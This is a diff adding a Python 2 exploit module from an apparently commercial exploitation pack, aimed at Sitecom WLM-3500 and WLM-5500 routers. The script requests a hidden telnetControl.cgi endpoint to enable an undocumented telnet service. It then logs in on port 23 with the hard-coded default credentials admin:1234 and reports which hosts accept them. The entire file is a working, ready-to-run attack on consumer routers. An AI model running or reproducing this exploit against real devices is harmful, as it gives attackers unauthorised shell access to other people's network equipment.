@@ -1,0 +1,80 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+try:
+  from telnetlib import Telnet
+except:
+  print 'No module telnetlib'
+
+_name_   = 'd2sec_sitecom_1'
+_vendor_ = 'sitecom'
+_model_  = ['WLM-3500 v2 001, firmware 1.07', 'WLM-5500 v1 001, firmware 1.15']
+_vuln_   = 'Undocumented Telnet service'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/cgi-bin/telnetControl.cgi' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+  else:
+    expected_login = [b"login: "]                    # detect login prompt
+    expected_pass = [b"Password: ", b"incorrect"]    # get password prompt
+    expected_ok = [b"#", b"%", b"\$", b"incorrect"]  # get login success
+    # default creds
+    user = 'admin'
+    password = '1234'
+    conn = Telnet()
+    try:
+      conn.open(host, 23, timeout=5)
+      ans = conn.expect(expected_login)
+      conn.write(user.encode('ascii') + b'\r\n')
+      ans = conn.expect(expected_pass)
+      if ans[0] == 1:  # username not authorized
+        conn.close()
+        print '[+] %s not vulnerable' % host
+        return False
+      conn.write(password.encode('ascii') + b'\r\n')
+      ans = conn.expect(expected_ok)
+      if ans[0] in (0, 1, 2):
+        print '[+] %s vulnerable: telnetd service enabled with default creds admin:1234!' % host
+        ret = True
+      else:
+        ret = False
+        print '[+] %s not vulnerable' % host
+      conn.close()
+      return ret
+    except Exception, e:  # ugly but telnetlib documentation is incomplete
+      conn.close()
+      print '[-] error : %s' % e
+      return False
+  return
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
